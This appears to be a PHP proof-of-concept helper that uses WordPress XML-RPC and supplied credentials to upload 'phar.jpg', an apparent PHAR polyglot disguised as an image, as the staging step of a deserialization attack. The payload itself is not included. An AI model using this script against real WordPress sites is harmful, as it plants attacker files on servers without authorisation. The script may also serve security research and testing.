#!/usr/bin/php
<?php
    //This is just a normal wordpress XMLRPC to upload a file
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-client.php');
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-base64.php');
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-request.php');
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-value.php');
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-message.php');
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-client.php');
    require_once( dirname( __FILE__ ) . '/IXR/class-IXR-error.php');

    $filename = "phar.jpg";
    $username = $argv[2];
    $password = $argv[3];
    $ip = $argv[1];
    $wpsite = 'http://'.$ip.'/wordpress';
    $xmlclient = $wpsite.'/xmlrpc.php';
    $client = new IXR_Client($xmlclient);
    $client->debug = true;
    $params = array('name' => 'phartest.jpg', 'type' => 'image/pwnage',
    'bits'=>new IXR_Base64(file_get_contents($filename)), 'overwrite' => false);
    if (!$res = $client->query('wp.uploadFile', 1, $username, $password, $params)) {
        die('Something went wrong â€“ '.$client->getErrorCode().' : '.$client->getErrorMessage());
    } else {
        $response = $client->getResponse();
        print_r($response);
    }
?>
